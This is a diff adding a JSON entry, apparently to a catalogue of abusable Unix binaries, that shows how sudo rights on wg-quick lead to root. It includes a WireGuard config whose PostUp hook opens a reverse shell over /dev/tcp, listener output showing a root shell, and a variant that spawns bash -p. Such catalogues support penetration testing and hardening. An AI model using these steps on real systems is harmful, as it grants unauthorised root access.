@@ -1,0 +1,10 @@
+{
+  "functions": {
+    "sudo": [
+      {
+        "description": "If the `sudo -l` shows such a binary in the output\n\n```\n(ALL) PASSWD: /usr/bin/wg-quick,\n```\n\nThis feature can be abused.\n",
+        "code": "Exploit,\n\n```\ncat << EOF > ./wg1.conf\n[Interface]\nListenPort = 51821\nPrivateKey = yNwWXHO7oIDQo/b5eS5R0xdVidxm50AwuQoIKTOGy1g=\n\nPostUp = sh -i >& /dev/tcp/127.0.0.1/1234 0>&1\n\nEOF\n```\n\n`sudo wg-quick up ./wg1.conf`\n\nWill send a reverse shell on `127.0.0.1:1234` with root privileges\n\n```\nnc -lvnp 1234\nlistening on [any] 1234 ...\nconnect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 55456\n# whoami\nroot\n```\n\nAnother more direct way to obain a shell is to avoid the usage of netcat at all\n\n```\ncat << EOF > ./wg1.conf\n[Interface]\nListenPort = 51821\nPrivateKey = yNwWXHO7oIDQo/b5eS5R0xdVidxm50AwuQoIKTOGy1g=\n\nPostUp = /bin/bash -p\n\nEOF\n```\n\n`sudo wg-quick up ./wg1.conf`\n\nThis will directly drop to a `root` shell.\n\n```\n#whoami\nroot\n```\n"
+      }
+    ]
+  }
+}
